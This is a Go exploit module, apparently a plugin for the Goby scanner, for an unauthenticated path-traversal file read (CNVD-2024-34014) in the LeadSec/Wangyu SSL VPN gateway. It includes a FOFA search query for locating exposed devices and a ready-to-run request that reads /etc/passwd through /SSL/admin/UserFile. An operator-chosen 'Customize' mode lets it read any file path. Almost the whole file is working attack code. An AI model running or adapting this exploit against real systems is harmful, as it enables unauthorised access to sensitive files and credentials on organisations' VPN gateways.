package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "wangyu VPN /SSL/admin/UserFile File Read Vulnerability(CNVD-2024-34014)",
    "Description": "<p>Beijing NetGuard Star Cloud Information Technology Co., Ltd. is a leading enterprise in the domestic information security industry, specializing in the research and development, production, and sales of information security products. There is an arbitrary file download vulnerability in the NetGuard VPN security gateway of Beijing NetGuard Star Cloud Information Technology Co., Ltd. Attackers can exploit this vulnerability to download sensitive files such as passwd without authentication.</p>",
    "Product": "leadsec-SSL-VPN",
    "Homepage": "https://www.leadsec.com.cn/",
    "DisclosureDate": "2024-08-19",
    "PostTime": "2024-10-12",
    "Author": "2987612621@qq.com",
    "FofaQuery": "(body=\"欢迎使用LeadSec网御SSL VPN\" || body=\"/SSL/down/UsbKey.exe\" || body=\"content=\\\"SSL,VPN,SSLVPN\" || body=\"/SSL/down/images_pc/\" || (header=\"Server: XDaemon v1.0\" && header!=\"couchdb\") || (banner=\"Server: XDaemon v1.0\" && banner!=\"couchdb\") || body=\"PasswordUserLogin\" || (header=\"Content-Length: 131\" &&header=\"Www-Authenticate\"&& body=\"401 unauthorized\"))",
    "GobyQuery": "(body=\"欢迎使用LeadSec网御SSL VPN\" || body=\"/SSL/down/UsbKey.exe\" || body=\"content=\\\"SSL,VPN,SSLVPN\" || body=\"/SSL/down/images_pc/\" || (header=\"Server: XDaemon v1.0\" && header!=\"couchdb\") || (banner=\"Server: XDaemon v1.0\" && banner!=\"couchdb\") || body=\"PasswordUserLogin\" || (header=\"Content-Length: 131\" &&header=\"Www-Authenticate\"&& body=\"401 unauthorized\"))",
    "Level": "1",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:</p><p><a href=\"https://www.leadsec.com.cn/\">https://www.leadsec.com.cn/</a></p>",
    "References": [
        "https://mp.weixin.qq.com/s/UXujNlADrykn2NSREuwDWQ"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "passwd,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "../../../etc/passwd",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/SSL/admin/UserFile?FileName=../../../etc/passwd",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:x:0:0",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        "CNVD-2024-34014"
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "网御VPN安全网关 /SSL/admin/UserFile 文件读取漏洞（CNVD-2024-34014）",
            "Product": "网御星云-SSL-VPN",
            "Description": "<p>北京网御星云信息技术有限公司是国内信息安全行业的领军企业，专业从事信息安全产品的研发、生产与销售。&nbsp;北京网御星云信息技术有限公司网御VPN安全网关存在任意文件下载漏洞，攻击者可利用该漏洞在未经身份验证的情况下下载passwd等敏感文件。<br></p>",
            "Recommendation": "<p>&nbsp;厂商已发布了漏洞修复程序，请及时关注更新:</p><p><a href=\"https://www.leadsec.com.cn/\">https://www.leadsec.com.cn/</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "wangyu VPN /SSL/admin/UserFile File Read Vulnerability(CNVD-2024-34014)",
            "Product": "leadsec-SSL-VPN",
            "Description": "<p>Beijing NetGuard Star Cloud Information Technology Co., Ltd. is a leading enterprise in the domestic information security industry, specializing in the research and development, production, and sales of information security products. There is an arbitrary file download vulnerability in the NetGuard VPN security gateway of Beijing NetGuard Star Cloud Information Technology Co., Ltd. Attackers can exploit this vulnerability to download sensitive files such as passwd without authentication.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:</p><p><a href=\"https://www.leadsec.com.cn/\">https://www.leadsec.com.cn/</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9959"
}`

postOrGet_zxciaszhfyuahusdfgyasnhudgasuijdi7aghsctgbasca := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
  respTxt := ""
  // 注意：返回值为（最终要返回的读取结果，错误）
  requestConfig := httpclient.NewGetRequestConfig("/SSL/admin/UserFile?FileName=" + fileUrl)
  requestConfig.VerifyTls = false
  requestConfig.FollowRedirect = false
  resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
  if err != nil || resp.StatusCode != 200 {
    err = errors.New("failed to read file")
    return "", err
  }
  respTxt = resp.RawBody
  return respTxt, nil
}

ExpManager.AddExploit(NewExploit(
  goutils.GetFileName(),
  expJson,
  func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
    // 此处需要修改：设置成功后的vulurl
    vulURL := "/SSL/admin/UserFile?FileName=../../../etc/passwd"
    // 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
    defaultModeMap := map[string]string{
      "../../../etc/passwd": "root:",
    }
    // 函数继承
    uploadFileFunc := postOrGet_zxciaszhfyuahusdfgyasnhudgasuijdi7aghsctgbasca

    // 请注意：后续代码为模板代码，非特殊情况，无需更改
    // ----------------------------------------------------------------------------------------------------------------------------------------------------
    for fileUrl, fileText := range defaultModeMap {
      resp, err := uploadFileFunc(u, fileUrl)
      if err != nil {
        continue
      }
      if strings.Contains(resp, fileText) {
        // 设置VULURL
        ss.VulURL = u.HostInfo + vulURL
        return true
      }
    }
    return false
  },

  func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
    var fileUrl string
    var fileText string
    mode := goutils.B2S(ss.Params["mode"])

    // 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
    defaultModeMap := map[string][2]string{
      "passwd": {"../../../etc/passwd", "root:"},
    }
    // 此处需要修改：函数继承
    uploadFileFunc := postOrGet_zxciaszhfyuahusdfgyasnhudgasuijdi7aghsctgbasca

    // 请注意，后续代码为模板固化，正常情况下均无需修改
    // ----------------------------------------------------------------------------------------------------------------------------------------------------
    if mode == "Customize" {
      fileUrl = goutils.B2S(ss.Params["Customize"])
    } else {
      if _, ok := defaultModeMap[mode]; ok {
        fileUrl = defaultModeMap[mode][0]
        fileText = defaultModeMap[mode][1]
      } else {
        expResult.Success = false
        return expResult
      }
    }

    // 获取返回结果url和返回请求头
    resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
    if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
      expResult.Success = false
      return expResult
    }

    expResult.Success = true
    expResult.Output = resp
    return expResult
  },
))
}